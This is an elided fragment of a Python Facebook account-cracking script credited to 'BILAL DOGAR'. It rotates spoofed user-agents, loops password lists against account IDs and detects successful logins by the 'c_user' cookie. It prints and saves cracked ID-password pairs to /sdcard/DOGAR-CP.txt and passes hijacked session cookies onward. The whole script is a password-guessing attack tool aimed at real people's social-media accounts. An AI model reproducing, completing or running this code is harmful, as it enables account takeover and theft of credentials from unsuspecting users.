...
Y = '\x1b[1;93m' 
os.system("git pull")
syed = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
  ...
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0."]
logo ="""\033[1;97m
       \033[1;32m'########::'####:'##::::::::::'###::::'##::::::::::
       \033[1;33m##.... ##:. ##:: ##:::::::::'## ##::: ##::::::::::
       \033[1;34m ##:::: ##:: ##:: ##::::::::'##:. ##:: ##::::::::::
       ...
       \033[1;33m########::'####: ########: ##:::: ##: ########::::
........:::....::........::..:::::..::........:::::
\t      \033[1;37m\033[1;41m JAN : AYESHA-CH \033[0m\033[1;37m
\033[1;37;1m-----------------------------------------------
\033[1;37;1m ▶ Author   : BILAL DOGAR
\033[1;37;1m ▶ Facebook : 100084390378894
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[BILAL-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[DOGAR-CP] '+cid+' | '+ps+'\033[0;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;92mBILAL-DOGAR\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
			sys.stdout.flush()
			ua = random.choice(syed)
...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\n\x1b[1;92m   ADMIN : \x1b[1;97mBILAL-DOGAR   \x1b[1;95mTOOL:\x1b[1;97mFREE     \x1b[1;91mV:\x1b[1;97m1.4.0
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m[BILAL-OK]  ' +cid+ ' | ' +ps+ '\033[1;32m'+  ' \n '+'  \033[0;97m')
                cek_apk(session,coki)
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;35m[DOGAR-CP]  ' +cid+ ' | ' +ps+      '  \33[0;97m')
                open('/sdcard/DOGAR-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
